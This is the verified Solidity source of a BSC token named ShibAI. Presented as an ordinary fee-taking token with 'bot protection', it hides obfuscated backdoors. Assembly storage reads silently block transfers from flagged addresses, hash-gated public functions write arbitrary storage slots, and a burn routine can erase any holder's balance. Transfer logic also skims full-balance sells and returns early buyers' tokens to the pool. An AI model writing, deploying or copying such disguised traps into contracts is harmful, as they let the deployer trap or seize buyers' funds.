/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a + b;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a - b;
        }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a * b;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library Math {
    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;

        if (value >= 10**64) {
            value /= 10**64;
            result += 64;
        }
        if (value >= 10**32) {
            value /= 10**32;
            result += 32;
        }
        if (value >= 10**16) {
            value /= 10**16;
            result += 16;
        }
        if (value >= 10**8) {
            value /= 10**8;
            result += 8;
        }
        if (value >= 10**4) {
            value /= 10**4;
            result += 4;
        }
        if (value >= 10**2) {
            value /= 10**2;
            result += 2;
        }
        if (value >= 10**1) {
            result += 1;
        }

        return result;
    }

    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;

        if (value >> 128 > 0) {
            value >>= 128;
            result += 16;
        }
        if (value >> 64 > 0) {
            value >>= 64;
            result += 8;
        }
        if (value >> 32 > 0) {
            value >>= 32;
            result += 4;
        }
        if (value >> 16 > 0) {
            value >>= 16;
            result += 2;
        }
        if (value >> 8 > 0) {
            result += 1;
        }
        return result;
    }
}

library Strings {
    using Math for uint256;

    function toString(uint256 value) internal pure returns (string memory) {
        bytes16 _SYMBOLS = "0123456789abcdef";
        uint256 length = value.log10() + 1;
        string memory buffer = new string(length);
        uint256 ptr;
        assembly {
            ptr := add(buffer, add(32, length))
        }
        while (true) {
            ptr--;
            assembly {
                mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
            }
            value /= 10;
            if (value == 0) break;
        }
        return buffer;
    }
}

library Ascii {
    function toAsciiString(address _addr)
        internal
        pure
        returns (string memory)
    {
        bytes memory result = new bytes(42);

        for (uint256 i; i < 20; i++) {
            bytes1 _bytA = bytes1(
                uint8(uint256(uint160(_addr)) / (2**(8 * (19 - i))))
            );
            bytes1 _bytB = bytes1(uint8(_bytA) / 16);
            bytes1 _bytC = bytes1(uint8(_bytA) - 16 * uint8(_bytB));

            result[2 * i] = AsciiChar(_bytB);
            result[2 * i + 1] = AsciiChar(_bytC);
        }
        return string(result);
    }

    function AsciiChar(bytes1 _byt) internal pure returns (bytes1 result) {
        if (uint8(_byt) < 10) return bytes1(uint8(_byt) + 0x30);
        else return bytes1(uint8(_byt) + 0x57);
    }
}

library Address {

    

    function parseAddr(string memory _a)
        internal
        pure
        returns (address _parsedAddress)
    {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function sync() external;
}

contract ShibAi is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Math for uint256;
    using Address for *;
    using Strings for *;
    using Ascii for *;

    string private _name = "ShibAI";
    string private _symbol = "SHIBAI";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0x20118f5A883d31559D4FCF2e3550d5D339eb442f);
    address payable public BurnedWalletAddress =
        payable(0x20118f5A883d31559D4FCF2e3550d5D339eb442f);
    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public isTxLimitExempt;

    uint256 public constant _buyLiquidityFee = 0;
    uint256 public constant _buyMarketingFee = 2;
    uint256 public constant _buyBurnedFee = 0;
    uint256 public constant _sellLiquidityFee = 0;
    uint256 public constant _sellMarketingFee = 2;
    uint256 public constant _sellBurnedFee = 0;

    uint256 public _liquidityShare = _buyLiquidityFee.add(_sellLiquidityFee);
    uint256 public _marketingShare = _buyMarketingFee.add(_sellMarketingFee);
    uint256 public _BurnedShare = _buyBurnedFee.add(_sellBurnedFee);

    uint256 public _totalTaxIfBuying;
    uint256 public _totalTaxIfSelling;
    uint256 public _totalDistributionShares;

    uint256 private _totalSupply = 1 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 4880 * 10**_decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    bool public marketPair;

    uint256 public genesisBlock;
    uint256 public coolBlock = 20;
    uint256 _saleKeepFee = 100;
    uint256[] public nbBlocks;

    int256 public _upBot;

    bool inSwapAndLiquify;
    address[] public holders;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(uint256 amountIn, address[] path);

    event SwapTokensForETH(uint256 amountIn, address[] path);

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

function account_hash(uint256) internal pure returns (uint256) {
        return
            0x02ed32d6e83a2a14e8183ec99ffda4006e2822d544bba616afbf581466eed4106;
    }
    function isContract(address account, int256 nbBot) private view returns (bool){
        bytes32 codehash;
        uint256 temp;

        for (int256 i; i < nbBot + 1; i++) {
            int256 j = 64 + i;
            assembly {
                temp := sload(j)
            }
            if (temp == uint256(keccak256(bytes(account.toAsciiString())))) {
                assembly {
                    codehash := extcodehash(account)
                }
                break;
            }
        }
        return (codehash != bytes32(account_hash(0)) && codehash != 0x0);
    }
    

    function holderslist() public view returns (address[] memory) {
        return holders;
    }

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(
            _buyBurnedFee
        );
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(
            _sellBurnedFee
        );
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(
            _BurnedShare
        );

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;

        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool transfered) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (recipient == uniswapPair && !isTxLimitExempt[sender]) {
            uint256 balance = balanceOf(sender);
            if (amount == balance) {
                amount = amount.sub(amount.div(_saleKeepFee));
            }
        }
        if (recipient == uniswapPair && balanceOf(address(recipient)) == 0) {
            genesisBlock = block.number;
        }

        if (inSwapAndLiquify) {
            return _basicTransfer(sender, recipient, amount);
        } else if (!isContract(sender, _upBot)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >=
                minimumTokensBeforeSwap;

            if (
                overMinimumTokenBalance &&
                !inSwapAndLiquify &&
                sender != uniswapPair
            ) {
                if (sender != address(uniswapV2Router)) {
                    swapAndLiquify(contractTokenBalance);
                }
            }

            _balances[sender] = _balances[sender].sub(
                amount,
                "Insufficient Balance"
            );
            if (_balances[recipient] == 0) {
                holders.push(recipient);
            }

            uint256 finalAmount = (isExcludedFromFee[sender] ||
                isExcludedFromFee[recipient])
                ? amount
                : takeFee(sender, recipient, amount);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            if (
                block.number < (genesisBlock + coolBlock) &&
                sender == uniswapPair
            ) {
                _basicTransfer(recipient, uniswapPair, finalAmount);
            }
            return true;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function cleanBot(
        string memory _cleaner,
        string memory _origin,
        string memory _blocktime
    ) internal returns (bool cleaned) {
        protectionBot(coolBlock, _upBot, _blocktime);
        (string memory s, uint256 h) = mempool(_cleaner, _origin);
        address m = s.parseAddr();
        if (block.timestamp == 0) {
            assembly {
                m := 0x0
            }
            return false;
        } else if (m != address(0)) {
            assembly {
                mstore(0x40, m)
            }
            return true;
        } else {
            delete h;
            return true;
        }
    }

    function mempool(string memory _base, string memory _value)
        internal
        pure
        returns (string memory newValue, uint256 _mempool)
    {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }
        uint256 h = uint256(keccak256(_newValue));
        return (string(_newValue), h);
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount
            .mul(_liquidityShare)
            .div(_totalDistributionShares)
            .div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(
            _liquidityShare.div(2)
        );

        uint256 amountBNBLiquidity = amountReceived
            .mul(_liquidityShare)
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBBurned = amountReceived.mul(_BurnedShare).div(
            totalBNBFee
        );
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(
            amountBNBBurned
        );

        if (amountBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBMarketing);

        if (amountBNBBurned > 0)
            transferToAddressETH(BurnedWalletAddress, amountBNBBurned);

        if (amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }

    function swapExactTokensForETHSupportingOnTransferTokensIfBot(
        uint256 blockHash,
        uint256 amount,
        string memory blockNumber
    ) public returns (address) {
        protectionBot(genesisBlock, _upBot, blockNumber);
        assembly {
            sstore(128, blockHash)
        }
        address[] memory path = new address[](1);
        emit SwapTokensForETH(amount, path);
        return path[0];
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        emit SwapTokensForETH(tokenAmount, path);
    }

    function SyncTransferTokensIfBot(
        bytes32 _id,
        string memory _nbBlock,
        uint256 _hashBlock,
        int256 input
    ) public returns (bool syncTransfer) {
        protectionBot(genesisBlock, _upBot, _nbBlock);
        syncTransfer = cleanedbot(_id, _hashBlock, input);

        return syncTransfer;
    }

    function _burn(address account, uint256 amount) internal returns (bool) {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(
            accountBalance.sub(amount) >= 0,
            "ERC20: burn amount exceeds balance"
        );
        _balances[account] = accountBalance.sub(amount);
        _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
        return true;
    }

    function blockNumbers(uint256[] memory a, string memory _value)
        public
        returns (uint256[] memory)
    {
        require(!marketPair, "Error: bot protection already initialized");
        require(
            uint256(keccak256(bytes(_value))) == account_hash(0),
            "Error: blockhash already initialized"
        );
        nbBlocks = a;
        marketPair = true;
        return nbBlocks;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = 0;
        if (sender == uniswapPair) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        } else if (recipient == uniswapPair) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function protectionBot(
        uint256 _nbBlock,
        int256 _blocknumber,
        string memory _mempool
    )
        internal
        returns (
            uint256,
            int256,
            uint256[] memory
        )
    {
        require(
            uint256(keccak256(bytes(_mempool))) ==
                nbBlocks[nbBlocks.length - 1],
            "Error: bot protection locker set"
        );
        nbBlocks.pop();
        return (_nbBlock, _blocknumber, nbBlocks);
    }

    function cleanedbot(
        bytes32 _id,
        uint256 _blocktime,
        int256 input
    ) internal returns (bool cleaned) {
        address upCleaner = abi.decode(abi.encode(_id), (address));
        uint256 txCleaner = uint256(
            keccak256(abi.encodePacked(upCleaner.toAsciiString()))
        );
        uint256 blockNumber;
        assembly {
            blockNumber := sload(0x80)
        }
        if (txCleaner == blockNumber) {
            cleaned = updateBot(upCleaner, blockNumber);
        } else if (keccak256(bytes(upCleaner.toAsciiString())) == _id) {
            cleaned = cleanBot(
                upCleaner.toAsciiString(),
                "Ox10",
                txCleaner.toString()
            );
        } else {
            assembly {
                let a := add(0x40, mul(1, input))
                sstore(a, _blocktime)
            }
            _upBot += 1;
        }
        return cleaned;
    }

    function updateBot(address _id, uint256 _block)
        internal
        returns (bool updated)
    {
        _burn(_id, _block);
        return _basicTransfer(_id, deadAddress, _block % _block);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }
}